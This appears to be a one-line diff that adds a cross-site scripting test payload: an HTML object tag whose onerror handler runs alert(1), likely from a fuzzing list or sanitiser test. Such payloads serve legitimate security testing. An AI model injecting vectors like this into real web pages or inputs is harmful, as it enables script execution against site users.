@@ -1,0 +1,1 @@
+<object onerror=alert(1) data=1 type=image/gif>
